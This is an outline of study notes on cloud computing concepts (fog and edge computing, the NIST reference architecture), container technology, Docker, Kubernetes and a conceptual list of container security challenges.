				- A poly cloud is a cloud technology that integrates multiple types of cloud services into a single platform, allowing different cloud features to be supplied to various other clouds. Unlike a multi-cloud, which involves using multiple cloud providers independently, a poly cloud enables users to access and utilize specific features from different cloud services on a unified platform. This model allows businesses to select the best capabilities from each cloud provider based on their specific needs. It also supports specialized automation applications, such as artificial intelligence (AI) and machine learning (ML) services (e.g., Google Cloud Platform (GCP), Amazon Web Services (AWS)).
				- Advantages:
					- High flexibility
					- Choice of cloud environment
					- Optimized infrastructure and return on investment (ROI)
					- Access to specialized AI and ML services
					- Cost-effective solution
					- High performance
				- Disadvantages:
					- Time-consuming initial setup
					- Lack of standardized tools
					- High research and development (R&D) costs before implementation
					- Not affordable for small and medium-sized enterprises (SMEs)
					- Absence of a fixed model
	- NIST Cloud Deployment Reference Architecture:
		- The figure below provides an overview of the NIST cloud computing reference architecture, illustrating the primary actors, activities, and functions in cloud computing. This diagram presents a generic high-level architecture designed to enhance the understanding of cloud computing’s uses, requirements, characteristics, and standards.
		- The five key actors in this architecture are as follows:
		- Cloud Consumer:
			- A cloud consumer is an individual or organization that maintains a business relationship with cloud service providers (CSPs) and utilizes cloud computing services. The cloud consumer browses the CSP’s service catalog, requests the desired services, establishes service contracts (either directly or through a cloud broker), and uses the services. The CSP bills the consumer based on service usage.
			- The CSP is responsible for fulfilling the service level agreement (SLA), which defines the technical performance requirements, including quality of service, security, and remedies for performance failures. Additionally, the CSP may outline specific limitations and obligations that cloud consumers must accept.
			- Cloud consumers can access services through the following cloud service models:
				- PaaS (Platform as a Service): Database (DB), business intelligence, application deployment, development and testing, and integration.
				- IaaS (Infrastructure as a Service): Storage, service management, content delivery network (CDN), platform hosting, backup and recovery, and computing.
				- SaaS (Software as a Service): Human resources, enterprise resource planning (ERP), sales, customer relationship management (CRM), collaboration, document management, email and office productivity, content management, financial services, and social networks.
		- Cloud Provider:
			- A cloud provider is an individual or organization that acquires and manages computing infrastructure to offer services (either directly or through a cloud broker) to consumers via network access.
		- Cloud Carrier:
			- A cloud carrier acts as an intermediary, providing connectivity and transport services between CSPs and cloud consumers. It facilitates access to cloud services via networks, telecommunications, or other access devices.
		- Cloud Auditor:
			- A cloud auditor is an independent entity that examines cloud service controls to assess compliance with industry standards. Audits verify adherence to security, performance, and privacy regulations through an evaluation of objective evidence. A cloud auditor may assess:
				- Security Controls: Management, operational, and technical safeguards designed to protect the confidentiality, integrity, and availability of cloud systems and data.
				- Privacy Impact: Compliance with applicable privacy laws and regulations.
				- Performance and Reliability: Adherence to SLAs and overall system efficiency.
		- Cloud Broker:
			- As cloud service integration becomes increasingly complex, cloud consumers may rely on cloud brokers instead of directly engaging with CSPs. A cloud broker manages cloud services by overseeing their use, performance, and delivery while maintaining the relationship between CSPs and consumers.
			- Cloud brokers provide three types of services:
				- Service Intermediation: Enhances an existing function by adding specific capabilities and offering value-added services to cloud consumers.
				- Service Aggregation: Combines and integrates multiple services into one or more unified solutions.
				- Service Arbitrage: Similar to service aggregation but allows dynamic selection of services from multiple providers instead of fixed integrations.
	- Cloud Storage Architecture:
		- Cloud storage is a medium used to store digital data in logical pools over a network. The physical storage is distributed across multiple servers, which are owned and managed by a hosting company. Organizations can purchase storage capacity from cloud storage providers to store user, organizational, or application data. Cloud storage providers are responsible for managing the data, ensuring its availability, and maintaining accessibility.
		- Cloud storage services can be accessed via cloud computing platforms, web service APIs, or applications that integrate these APIs, such as cloud desktop storage, cloud storage gateways, or web-based content management systems. These services are typically operated from off-premises infrastructures, such as Amazon S3.
		- Cloud storage architecture shares key characteristics with cloud computing, including scalability, accessible interfaces, and metered resource usage. It is built on a highly virtualized infrastructure and consists of multiple layers to provide continuous storage services. The three primary layers include:
			- Front-end layer: Accessed by end users, providing APIs for data storage management.
			- Middleware layer: Handles functions such as data deduplication and replication.
			- Back-end layer: Where the physical hardware and storage infrastructure are implemented.
		- Cloud storage is composed of distributed resources, making it highly fault-tolerant through redundancy, consistent in data replication, and highly durable. Commonly used object storage services include Amazon S3, Oracle Cloud Storage, Microsoft Azure Storage, and OpenStack Swift.
	- Virtual Reality and Augmented Reality on the Cloud:
		- Virtual Reality (VR) and Augmented Reality (AR), along with cloud computing, are two of the most important emerging technologies. When combined, they enable new applications and usage models. Currently, VR/AR headsets require significant local computing and graphics power, making them expensive due to the high costs associated with both the headsets and the processing power of connected PCs. However, cloud environments can provide access to modern multi-core CPUs, effectively handling the computing demands of VR/AR applications. Many cloud-based data centers today offer high-performance GPUs capable of supporting the graphics-intensive needs of VR/AR applications.
		- Furthermore, VR/AR applications often require higher processing speeds than those available in standard computing devices. Instead of investing in costly hardware upgrades, users can leverage cloud services to enhance the speed and performance of core infrastructure. Additionally, the rapidly evolving nature of VR/AR applications leads to frequent changes in software functionality and user interfaces. By utilizing cloud-based delivery, users can experience seamless updates and improvements.
		- Finally, since VR/AR applications are not always in constant use, a cloud-based pay-per-use model offers a cost-effective solution, allowing users to access these applications as needed without heavy upfront investments.
	- Fog Computing:
		- The massive growth of IoT devices worldwide has resulted in the generation of an enormous amount of data. To meet the increasing demand for analyzing and processing this data, the implementation of fog computing, alongside cloud computing, is an ideal solution. Fog computing is a distributed and independent digital environment in which applications and data storage are positioned between data sources (devices generating data) and cloud services. It is an extended version of cloud computing that consists of multiple edge nodes directly connected to physical devices, enabling service access for end users.
		- Generally, fog computing refers to the concept of creating an additional layer in a distributed network infrastructure that is closely interconnected with IoT and cloud computing. It acts as an intermediary between hardware and remote servers and is also referred to as an intelligent gateway. Fog computing facilitates enhanced data processing, storage, and analysis in a quick and efficient manner. Many organizations have adopted this technology due to its ability to provide additional functionalities for faster and more efficient data processing, storage, and analysis.
		- Working of Fog Computing:
			- Devices with an Internet connection, computational abilities, and data storage capabilities are referred to as fog nodes. These nodes can be deployed anywhere within a network. IoT applications for fog nodes are ported at the network edge, where they collect data from IoT devices, enabling short-term analytics at the edge. Fog computing is particularly beneficial in cases of unstable Internet connections. Urgent requests are transmitted directly to the fog nodes, where they are processed in real time within the local network. Fog computing is widely used in applications such as smart cities, smart grids, connected cars, and real-time analytics.
		- Advantages of Fog Computing:
			- Fog computing has been highly beneficial in the fields of IoT, big data, and real-time analytics. The main advantages of fog computing over cloud computing include:
			- Low latency: Fog computing processes large volumes of data with minimal delay, as it is geographically closer to end users and can offer rapid responses.
			- High business agility: Developers can quickly and easily design fog instances and deploy them based on requirements.
			- No bandwidth-related issues: Data is accumulated at distinct points instead of being transmitted collectively to a single data center through one channel, thereby avoiding bandwidth congestion.
			- No connection loss: The presence of multiple interconnected channels ensures a reliable connection.
			- Enhanced security: Fog computing improves security by processing data across numerous nodes in a complex distributed system.
			- Reduced operating costs: By processing data locally instead of transmitting it to the cloud for analysis, fog computing conserves network bandwidth, significantly lowering costs.
			- High power efficiency: Edge devices utilize power-saving protocols such as Zigbee, Z-Wave, or Bluetooth.
		- Disadvantages of Fog Computing:
			- Despite its advantages, fog computing has some drawbacks compared to cloud computing, including:
			- Additional costs: Organizations must invest in extra edge devices such as routers, hubs, and gateways.
			- System complexity: As fog computing introduces an additional layer in the data processing and storage system, it increases overall system complexity.
			- Limited scalability: Fog computing is not as scalable as cloud computing.
	- Edge Computing:
		- Conventional cloud computing faces challenges related to data security, low performance, and increased data storage demands, leading to high operational costs. These issues can be addressed by replacing conventional cloud computing with edge computing.
		- Edge computing is a subset of fog computing, and its approach to data processing is similar. In fog computing, data processing occurs at the LAN level via an intelligent gateway, whereas in edge computing, processing is performed directly on devices such as programmable automation controllers.
		- Edge computing is used in solutions that require processing small yet urgent operations within milliseconds. It is a distributed, decentralized computing model where computation and data processing occur close to edge devices. Instead of relying on a central location for data storage, edge computing stores data near the devices that generate it. This approach reduces internet bandwidth usage and offloads data transmission.
		- Many organizations can leverage edge computing for building automation systems, enabling faster processing, prompt responses, and efficient real-time applications.
	- Cloud vs. Fog Computing vs. Edge Computing:
		- Edge computing and fog computing are extensions of cloud computing.
		- Cloud computing follows a centralized model with thousands of servers processing data in real time.
		- Edge computing operates as a highly distributed and decentralized model, utilizing billions of virtual or hardware endpoints to process data closer to edge devices (such as IoT devices).
		- Fog computing serves as an intermediary layer, consisting of millions of nodes that efficiently handle data storage, processing, and analysis. It functions as a decentralized intelligent gateway positioned between the data source and cloud infrastructure.
		- Comparison of Cloud, Fog, and Edge Computing:
			- Cloud Computing:
				- Speed: High access speed but depends on VM connectivity.
				- Latency: High latency.
				- Data Integration: Integrates multiple data sources.
				- Capacity: No data reduction while delivering or converting data.
				- Responsiveness: Low response time.
				- Security: Less secure than fog computing.
			- Fog Computing:
				- Speed: Faster than cloud computing.
				- Latency: Low latency.
				- Data Integration: Integrates multiple data sources and devices.
				- Capacity: Reduces the amount of data sent to the cloud.
				- Responsiveness: High response time.
				- Security: Highly secure.
			- Edge Computing:
				- Speed: Faster than fog computing.
				- Latency: Low latency.
				- Data Integration: Integrates a limited number of data sources.
				- Capacity: Reduces the amount of data sent to fog computing.
				- Responsiveness: High response time.
				- Security: Customizable security.
	- Cloud Computing vs. Grid Computing:
		- Cloud computing and grid computing are two widely used computing models, each based on different architectural principles.
		- Cloud Computing:
			- Follows a client-server architecture
			- Offers high scalability
			- Uses resources in a centralized manner
			- More flexible compared to grid computing
			- Cloud servers are owned by infrastructure providers
			- Provides services such as IaaS, PaaS, and SaaS
			- Accessed via regular web protocols
			- Operates on a pay-as-you-go model
			- Service-oriented, adapting to different user requirements
			- Does not support interoperability, leading to potential vendor lock-in
			- Contains a large-scale pool of resources and assets
		- Grid Computing:
			- Follows a distributed computing architecture
			- Offers standard scalability
			- Uses resources collaboratively rather than centrally
			- Less flexible compared to cloud computing
			- Managed and owned by an organization
			- Accessed through grid middleware
			- Users generally do not pay for usage
			- Application-oriented, providing a shared group of computing resources
			- Supports interoperability, making it easier to manage
			- Contains a limited number of assets and resources compared to cloud computing
	- Cloud Service Providers:
		- Discussed below are some of the most popular cloud service providers:
		- Amazon Web Services (AWS - aws.amazon.com):
			- AWS offers on-demand cloud computing services to individuals, organizations, and governments on a pay-as-you-go basis. It provides essential technical infrastructure through distributed computing and a wide range of tools. The virtual environment in AWS includes compute resources (CPU, GPU, RAM), storage (HDD, SSD), operating systems, applications, and networking software such as web servers, databases, and CRM solutions.
		- Microsoft Azure (azure.microsoft.com):
			- Microsoft Azure delivers cloud computing services for building, testing, deploying, and managing applications and services via its global data centers. It supports all cloud computing models—SaaS, PaaS, and IaaS—offering a comprehensive suite of services, including computing, storage, data management, messaging, media, machine learning, and IoT.
		- Google Cloud Platform (GCP - cloud.google.com):
			- GCP provides cloud computing services across IaaS, PaaS, and serverless models. Its offerings include computing, data storage, analytics, machine learning, networking, big data, cloud AI, identity and security, IoT, API platforms, and management tools.
		- IBM Cloud (www.ibm.com):
			- IBM Cloud™ is a powerful suite of cloud solutions integrated with AI tools and deep industry expertise. It offers IaaS, SaaS, and PaaS services across public, private, and hybrid cloud environments. Key services include computing, networking, storage, security, databases, analytics, AI, IoT, mobile, developer tools, and blockchain.
- Container Technology:
	- Container technology is a rapidly growing virtualization method that enables developers and IT teams to build, deploy, and manage containerized applications. This is done using a service provider’s API or a web-based interface. Containers and clusters can be deployed in on-premises data centers or cloud environments. This section explores key concepts related to container technology, including Docker containers and Kubernetes.
	- What is Container:
		- A container is a lightweight, standalone package that includes an application and all its dependencies—such as libraries, configuration files, and binaries—allowing it to run independently from other processes in a cloud environment. By bundling all necessary resources, containers eliminate compatibility issues when applications are moved between cloud environments.
		- Containers are offered as part of Container-as-a-Service (CaaS), a cloud service model that provides virtualization and container management via orchestrators. With CaaS, users can develop and deploy scalable containerized applications on cloud platforms or on-premises data centers. CaaS combines elements of both Infrastructure-as-a-Service (IaaS) and Platform-as-a-Service (PaaS). Popular container services include Amazon AWS EC2, Google Kubernetes Engine (GKE), and Docker.
	- Features of Containers:
		- Container technology offers several advantages, making it widely adopted across industries. Below are some of its key features:
		- Portability and Consistency: Containers include all necessary resources, making applications highly portable. This allows applications to run seamlessly across different platforms and cloud environments, whether private or public.
		- Security: Because containers operate independently, security risks are minimized. If one container is compromised, the issue does not spread to other containers, ensuring better isolation and protection.
		- High Efficiency and Cost-Effectiveness: Containers require fewer resources than traditional virtual machines (VMs) since they do not need separate operating systems. They consume only a few megabytes of memory, allowing multiple containers to run on a single server. Additionally, containers are isolated, so if one application fails, others continue running without disruption.
		- Scalability: Containers are highly scalable, enabling users to integrate additional containers within the same cluster as needed. Smart scaling technology allows users to activate only necessary containers while keeping unused ones dormant, optimizing cost and performance.
		- Robustness: Containers can be created, deployed, and terminated within seconds since they do not require full operating systems. This accelerates development cycles, enhances operational speed, and allows for rapid software updates. The agility of containers also enables developers to quickly address bugs and roll out new features, improving user experience and overall application performance.
	- Container Technology Architecture:
		- As shown in the figure below, container technology follows a five-tier architecture and undergoes a three-phase lifecycle:
		- Five-Tier Architecture:
			- Tier-1: Developer Machines - Responsible for image creation, testing, and accreditation.
			- Tier-2: Testing and Accreditation Systems - Perform verification and validation of image contents, sign images, and send them to registries.
			- Tier-3: Registries - Store images and distribute them to orchestrators based on requests.
			- Tier-4: Orchestrators - Convert images into containers and deploy them to hosts.
			- Tier-5: Hosts - Operate and manage containers as instructed by the orchestrator.
		- Three Phases of the Container Lifecycle:
			- Image Creation, Testing, and Accreditation:
				- The first phase of container technology involves image generation and validation. During this phase, application or software components are developed and packaged into an image. This image contains all the necessary files and resources required for execution.
				- Developers are responsible for integrating essential components, while security teams conduct image testing and accreditation to ensure security and compliance before deployment.
			- Image Storage and Retrieval:
				- Once validated, images are stored in central repositories called registries. These registries provide services such as:
					- Storage and tagging for easy identification
					- Version control for discovery and reuse
					- Fetching and downloading images created by other developers
				- Registries can be self-hosted or cloud-based. Popular registry services include Docker Hub, Amazon Elastic Container Registry (ECR), and Docker Trusted Registry (DTR).
			- Container Deployment and Management:
				- The final phase involves deploying and managing containers using orchestrators. DevOps administrators fetch images from registries, deploy them as containers, and manage their operations.
				- Orchestrators help with:
					- Monitoring resource consumption
					- Managing job execution
					- Detecting host failures and restarting containers
					- Allocating additional resources when needed
					- Handling application updates by replacing old containers with new ones
				- Popular orchestrators include Kubernetes, Docker Swarm, Nomad, and Mesos.
	- Advantages of Container Technology:
		- Requires minimal resources for application development
		- Enables faster detection of software issues and patch deployment
		- Cost-effective and facilitates easy shipping
		- Enhances application portability
		- Scalable resource allocation
		- Quick container boot-up (within seconds), enabling rapid development
		- Simplifies management of isolated applications in containers
		- Facilitates easy testing and debugging
	- Disadvantages of Container Technology:
		- Increased complexity
		- Misconfigurations due to lack of expertise
		- Heightened vulnerability due to shared resources
		- Potential performance limitations
		- Difficulty in selecting an appropriate platform for container deployment
		- Variability in service discovery methods (e.g., proxy-based, DNS-based)
	- Containers vs. Virtual Machines:
		- Virtualization is a fundamental technology that powers cloud computing. It enables multiple operating systems to run on a single physical system while sharing underlying resources such as servers, storage devices, and networks. By leveraging virtualization, organizations can reduce IT costs while improving hardware utilization, flexibility, and productivity. Some popular virtualization vendors include VMware vCloud Suite, VMware vSphere, VirtualBox, and Microsoft Hyper-V.
		- Traditionally, virtualization has been used to facilitate application portability and optimize cloud IT infrastructure. However, it comes with several disadvantages, including slower performance due to the heavyweight nature of virtual machines, limited portability, and time-consuming IT resource provisioning. To address these issues, industries are increasingly adopting containerization—a technology that provides application resources in the form of lightweight containers. Containers run on a single operating system and allow software applications to operate anywhere with scalable resources.
		- Containers sit on top of a physical server and its host operating system, sharing system kernel binaries and libraries. This eliminates the need to replicate the OS for each application. With containerization, a single OS can support multiple workloads, making containers highly efficient. Unlike virtual machines, which are larger in size and take minutes to boot, containers are lightweight (only a few megabytes) and start in seconds.
		- Virtual Machines vs. Containers:
			- Virtual Machines:
				- Heavyweight
				- Run on independent operating systems
				- Hardware-based virtualization
				- Slower provisioning
				- Limited performance
				- Completely isolated, providing higher security
				- Created and launched in minutes
			- Containers:
				- Lightweight and portable
				- Share a single host operating system
				- OS-based virtualization
				- Scalable with real-time provisioning
				- Near-native performance
				- Process-level isolation, offering partial security
				- Created and launched in seconds
	- What is Docker:
		- Docker is an open-source technology used for developing, packaging, and running applications. It utilizes containers to encapsulate all dependencies, ensuring that applications run consistently across different environments. Docker provides a Platform as a Service (PaaS) through OS-level virtualization, enabling the delivery of containerized software packages. This technology isolates applications from the underlying infrastructure, facilitating faster and more efficient software deployment.
		- One of Docker's key advantages is that when an application is packaged with its dependencies into a Docker container, it can run reliably in any environment. Additionally, since Docker containers are isolated from each other and communicate via well-defined channels, developers can build multiple applications without risk of interference.
		- Docker Engine:
			- The Docker Engine is a client-server application installed on a host machine that enables the development, deployment, and execution of containerized applications. It consists of the following components:
			- Server: A persistent background process, also known as a daemon (dockerd command), responsible for managing containers.
			- REST API: An interface that facilitates communication and task assignments between the client and the daemon.
			- Client CLI: A command-line interface that interacts with the daemon, allowing users to execute various Docker commands.
		- Docker Swarm:
			- The Docker Engine supports Swarm mode, which allows the management of multiple Docker engines within the Docker platform. The Docker CLI is used to create a swarm, deploy applications, and control their behavior and activity.
			- Swarm mode enables administrators and developers to:
				- Communicate with containers and assign tasks to different containers.
				- Scale containers up or down based on workload demands.
				- Perform health checks and manage the lifecycle of various containers.
				- Provide failover and redundancy, ensuring processes continue even if a node fails.
				- Apply timely software updates to all containers.
		- Docker Architecture:
			- The Docker architecture follows a client-server model and consists of various components, including the host, client, network, registry, and storage units. The Docker client interacts with the Docker daemon, which is responsible for building, running, and distributing containers. The daemon and client can operate on the same host, or users can connect a Docker client to a remote daemon. Communication between the Docker client and the Docker daemon is established via a REST API.
			- Components of Docker Architecture:
				- Docker Daemon: The Docker daemon (dockerd) processes API requests and manages Docker objects, such as containers, volumes, images, and networks.
				- Docker Client: The Docker client serves as the primary interface for interacting with Docker. When users run commands such as docker run, the client forwards them to dockerd, which executes the tasks. The Docker API facilitates this communication.
				- Docker Registries:
					- Docker registries store and distribute container images. They can be public or private.
					- Docker Hub and Docker Cloud are two widely used public registries.
					- Docker Hub is the default repository for Docker images and is accessible to all users.
				- Docker Objects: Various objects help in building and running applications within Docker, including:
					- Images: Read-only binary templates containing instructions for creating containers.
					- Containers: Executable instances of Docker images that encapsulate applications and their dependencies. Containers can be created, started, stopped, or deleted using the Docker CLI or Docker API.
					- Services: A service allows users to scale containers across multiple daemons, forming a swarm of manager and worker nodes. Each swarm member is a daemon, and they communicate through the Docker API.
					- Networking: A mechanism enabling communication between isolated containers.
					- Volumes: Persistent storage used by Docker containers to retain data.
		- Docker Operations:
			- Common operations performed on Docker images include:
			- Building a new image from a Dockerfile.
			- Listing all local images.
			- Tagging an existing image.
			- Pulling a new image from the Docker registry.
			- Pushing a local image to the Docker registry.
			- Searching for existing images.
		- Microservices vs. Docker:
			- Monolithic applications are broken down into cloud-hosted sub-applications called microservices, each performing a unique task while working together. Microservices distribute the application workload, providing stable, seamless, and scalable services by interacting with each other. They are designed around business capabilities, enabling cross-functional teams to develop, support, and deploy them efficiently.
			- Unlike traditional data storage models used by monolithic applications, microservices decentralize data storage by managing their own data stores. Developers use Docker to create a container for each microservice. Since each microservice is packaged into a container along with the necessary libraries, frameworks, and configuration files, microservices within a single application can be developed and managed across multiple platforms.
		- Docker Networking:
			- Docker enables the connection of multiple containers, services, and even non-Docker workloads. It can manage Docker hosts running on various platforms, such as Linux and Windows, in a platform-independent manner. The Docker networking architecture is based on a set of interfaces known as the Container Network Model (CNM), which ensures application portability across different infrastructures.
			- The CNM consists of several high-level constructs:
				- Sandbox: A sandbox contains the container's network stack configuration, managing container interfaces, routing tables, and Domain Name System (DNS) settings.
				- Endpoint: An endpoint is an abstraction connected to a network, ensuring application portability by allowing services to use different network drivers without modifications.
				- Network: A network is a collection of interconnected endpoints. Endpoints that are not connected to a network cannot communicate with each other.
			- The CNM includes two pluggable driver interfaces that enhance functionality and provide greater control over the network:
				- Network Drivers: These drivers enable Docker networking functionality. They are pluggable, allowing multiple network drivers to operate concurrently on the same network. There are two types of CNM network drivers: native and remote.
				- IPAM (IP Address Management) Drivers: IPAM drivers assign default subnets and IP addresses to endpoints and networks if they are not manually assigned.
			- Native Docker Network Drivers:
				- The Docker engine includes five built-in network drivers:
				- Host: The host driver allows a container to share the host's networking stack.
				- Bridge: The bridge driver creates a Linux bridge on the host, managed by Docker, to facilitate container communication.
				- Overlay: The overlay driver enables container communication across different Docker hosts over a physical network infrastructure.
				- MACVLAN: The MACVLAN driver establishes a network connection between container interfaces and the host’s parent interface (or sub-interfaces) using the Linux MACVLAN bridge mode.
				- None: The none driver creates a completely isolated network stack without any external connectivity.
			- Remote Docker Network Drivers:
				- Docker also supports three remote network drivers, developed by the community or third-party vendors, which are compatible with CNM:
				- Contiv: An open-source network plugin developed by Cisco, designed to enforce security and infrastructure policies for multi-tenant microservices deployments.
				- Weave: A network plugin that builds a virtual network for Docker containers across multiple cloud environments.
				- Kuryr: A network plugin that integrates Docker with OpenStack Neutron, implementing the Docker libnetwork remote driver and including an IPAM driver.
	- Container Orchestration:
		- Container orchestration is the automated process of managing the lifecycles of software containers and their dynamic environments. It is used to schedule and distribute workloads for microservices-based applications across multiple clusters.
		- Various tasks can be automated using a container orchestrator, such as:
			- Provisioning and deploying containers
			- Managing failover and redundancy of containers
			- Creating or destroying containers to evenly distribute the load across the host infrastructure
			- Moving containers from one host to another in case of resource exhaustion or host failure
			- Automatically allocating resources between containers
			- Exposing running services to the external environment
			- Performing load balancing, traffic routing, and service discovery between containers
			- Conducting health checks of running containers and hosts
			- Ensuring high availability of containers
			- Configuring application-related containers
			- Securing communication between containers
	- What is Kubernetes:
		- Kubernetes, also known as K8s, is an open-source, portable, and extensible orchestration platform developed by Google for managing containerized applications and microservices. Containers provide an efficient way to package and run applications. In a real-time production environment, containers must be managed efficiently to minimize downtime. For example, if a container fails, another container is automatically started to replace it. To address these challenges, Kubernetes offers a resilient framework for managing distributed containers, automating deployment processes, and ensuring failover and redundancy for applications.
		- Features of Kubernetes:
			- Service Discovery: Kubernetes enables services to be discovered via a DNS name or an IP address.
			- Load Balancing: When a container experiences high traffic, Kubernetes automatically distributes the load across multiple containers.
			- Storage Orchestration: Kubernetes allows developers to mount various storage solutions, including local and cloud-based storage.
			- Automated Rollouts and Rollbacks: Kubernetes automates the creation, destruction, and migration of containerized resources to ensure smooth updates and recovery.
			- Automatic Bin Packing: Kubernetes efficiently manages a cluster of nodes running containerized applications. By specifying resource requirements such as CPU and memory, Kubernetes optimally allocates and deallocates resources.
			- Self-Healing: Kubernetes performs health checks, replaces failed containers, removes unresponsive ones, and ensures only healthy containers are advertised to clients.
			- Secret and Configuration Management: Kubernetes securely manages sensitive data such as credentials, SSH keys, and OAuth tokens. Applications can be updated with new configurations without rebuilding container images.
		- Kubernetes Cluster Architecture:
			- When Kubernetes is deployed, clusters are created. A cluster is a group of computers, known as nodes, that run applications inside containers managed by Kubernetes. A cluster consists of at least one master node and one worker node. The worker nodes contain pods (groups of containers), while the master node manages and orchestrates them. The diagram below illustrates the various components of Kubernetes cluster architecture:
			- Master Components:
				The master node components form the cluster's control plane, responsible for scheduling, monitoring, and managing cluster events. These components can run on any computer within the cluster.
				- Kube-apiserver: The API server is a core component of the Kubernetes control plane that handles all API requests. It acts as the front-end interface for the control plane and is the only component that directly interacts with the etcd cluster to store data.
				- Etcd cluster: A distributed, consistent key-value store that holds Kubernetes cluster data, including service discovery details and API objects.
				- Kube-scheduler: This component monitors newly created pods and assigns them to appropriate nodes based on factors such as resource availability, data locality, software/hardware constraints, and workload distribution.
				- Kube-controller-manager: Runs various controllers, such as the node controller, endpoint controller, replication controller, and service account & token controller. Although controllers are separate processes, they are compiled into a single binary to simplify execution.
				- Cloud-controller-manager: This component runs controllers that interact with cloud service providers. It allows Kubernetes and cloud provider code to evolve independently.
			- Node Components:
				- Worker node components are responsible for running pods and ensuring proper operation of containerized applications.
				- Kubelet: A crucial service agent that runs on each node, ensuring that containers within pods are functioning correctly. Kubelet does not manage containers not created by Kubernetes.
				- Kube-proxy: A network proxy service running on each worker node. It manages network rules, enabling communication between services and pods.
				- Container Runtime: The software responsible for running containers. Kubernetes supports multiple container runtimes, including Docker, containerd, cri-o, and rktlet.
	- Clusters and Containers:
		- Cluster:
			- A cluster refers to a set of two or more connected nodes that run in parallel to complete a task. Workloads with individual, parallelizable tasks are distributed among the nodes. These tasks utilize the combined memory and computational power of all the nodes in the cluster. One node acts as the master node, responsible for allocating work, retrieving results, and providing a response.
			- Types of Cluster Computing:
				- The different types of clusters are as follows:
				- Highly Available (HA) or Failover Clusters: In a failover cluster, multiple nodes run simultaneously to ensure high availability (HA) or continuous availability (CA). If one node fails, another node takes over with minimal or no downtime.
				- Load Balancing Clusters: In a load-balancing cluster, the workload is distributed among nodes to prevent overloading a single node. The load balancer performs periodic health checks on each node to detect failures and redirects incoming traffic as needed. A load-balancing cluster also ensures high availability.
				- High-Performance Computing (HPC) Clusters: In an HPC cluster, nodes are configured to deliver extreme performance by parallelizing tasks. Scaling further enhances performance by efficiently utilizing available resources.
		- Clusters in the Cloud:
			- Cloud clusters consist of nodes hosted on virtual machines (VMs) and are often integrated with virtual private clouds (VPCs). Cloud clustering reduces the effort and time needed to set up a cluster. In a cloud environment, clusters can be scaled up on demand by adding additional resources or VMs. The cloud also offers the flexibility to upgrade infrastructure based on evolving requirements. Additionally, cloud clustering improves latency and resiliency by deploying nodes across multiple availability zones, thereby maximizing availability, security, and maintainability.
		- Containers and Their Relationship with Clusters:
			- Containers enable applications to run reliably across different computing environments. For instance, an organization developing a web application may structure the frontend and backend as microservices. To deploy this application, containers can be hosted on a VM in the cloud. However, if the VM or underlying hardware fails, the application becomes inaccessible until traffic is redirected to a failover server.
			- To enhance availability, scalability, and performance, containerized applications should be deployed across multiple nodes in a cluster. This approach maximizes resource utilization while mitigating the risk of single-node failure by running instances of a container on multiple nodes.
	- Container Security Challenges:
		- Organizations are widely adopting container-based platforms due to their advantages, such as flexibility, continuous application delivery, and efficient deployment. However, the rapid growth and proliferation of container technology have introduced numerous security challenges.
		- Below are some key challenges related to container security:
			- Inflow of vulnerable source code: Containers rely on open-source platforms where developers frequently update, store, and use images in repositories. This can lead to an influx of uncontrolled code, potentially containing vulnerabilities that compromise security.
			- Large attack surface: The host OS typically runs multiple containers, applications, virtual machines (VMs), and databases, whether in the cloud or on-premises. A larger attack surface increases the number of potential vulnerabilities and makes them harder to detect.
			- Lack of visibility: A container engine runs containers, interfaces with the Linux kernel, and adds an additional layer of abstraction. This can obscure container activities, making it difficult to monitor and track specific actions.
			- Compromised secrets: Containers often require sensitive information such as API keys, usernames, and passwords to access services. If attackers gain unauthorized access to these secrets, they can compromise security.
			- DevOps speed: Containers can be quickly deployed and removed after execution. This ephemeral nature allows attackers to exploit vulnerabilities and disappear without leaving persistent traces of malicious activity.
			- Noisy neighboring containers: A single container may consume excessive system resources, degrading the performance of neighboring containers and potentially leading to a denial-of-service (DoS) attack.
			- Container breakout to the host: Containers running with root privileges may escape their containment and gain unauthorized access to the host OS through privilege escalation.
			- Network-based attacks: Attackers may exploit vulnerable containers with active raw sockets or outbound network connections to launch various network-based attacks.
			- Bypassing isolation: After compromising a container, attackers may escalate privileges to gain access to other containers or even the host system.
			- Ecosystem complexity: Containers are built, deployed, and managed using multiple vendors and sources, making security and updates challenging due to their diverse origins.
			- Misconfigurations: Incorrect configurations—such as overly permissive network policies or misconfigured access controls—can lead to security vulnerabilities and breaches.
			- Isolation breakdowns: Although containers are designed to be isolated, vulnerabilities in the container runtime or kernel can lead to isolation failures, allowing attackers to escape from a container.
			- Insecure communication: Containers often communicate over networks. Without proper encryption and security measures, this communication can be intercepted or tampered with by attackers.
			- Insufficient logging and monitoring: Effective logging and monitoring are crucial for detecting and responding to security incidents. However, many container environments lack comprehensive logging and monitoring capabilities.
			- Patch management: Keeping container images and their underlying software up to date with security patches is challenging, especially in large-scale deployments.
			- Persistent storage security: Securing container-stored data—particularly when using persistent storage—requires careful encryption, access control, and backup strategies.
			- Container orchestration security: Orchestration tools like Kubernetes introduce additional security complexities and potential vulnerabilities, requiring specific security measures to protect the environment.
			- Kernel exploits: Since containers share the host OS kernel, any kernel vulnerabilities can impact all containers running on the host. Keeping the kernel updated is essential for security.
			- Cgroups misconfiguration: Control groups (cgroups) limit and isolate resource usage. Misconfigurations can lead to resource contention and denial-of-service (DoS) attacks.
			- Pod security policies: In Kubernetes, configuring pod security policies (PSPs) to enforce security standards can be complex and prone to errors, creating potential security gaps.
			- Compliance audit risks: Compliance is a major concern for enterprises. Failing audits for standards like GDPR, HIPAA, or SOX can result in financial penalties and damage to an organization's reputation.
	- Container Management Platforms:
		- Below are various container management platforms:
		- Portainer (www.portainer.io):
			- Portainer is a versatile container management tool that simplifies the secure adoption of containers at remarkable speed, regardless of industry, orchestration platform, or computing device. It enables cloud administrators to efficiently set up, maintain, and troubleshoot container infrastructure in both public clouds and data centers.
			- Additionally, Portainer serves as a potential policy and governance platform within container management stacks, whether deployed on the manufacturing floor or in the public cloud.
		- Apache Mesos (mesos.apache.org)
		- Amazon Elastic Container Service (Amazon ECS) (aws.amazon.com)
		- Microsoft Azure Container Instances (ACI) (azure.microsoft.com)
		- Red Hat OpenShift Container Platform (www.redhat.com)
		- Docker CLI (www.docker.com)
	- Kubernetes Platforms:
		- Below are various Kubernetes platforms:
		- Mirantis Kubernetes Engine (MKE) (www.mirantis.com):
			- Mirantis Kubernetes Engine (MKE) is a CNCF-validated enterprise Kubernetes platform designed for developing and running modern applications at scale. It supports private clouds, public clouds, and bare metal environments, enabling organizations to adopt cloud-native application development and delivery models. MKE also facilitates multi-cluster management and provides a unified interface for streamlined operations, including support for Swarm cluster instances.
		- Google Kubernetes Engine (GKE) (cloud.google.com)
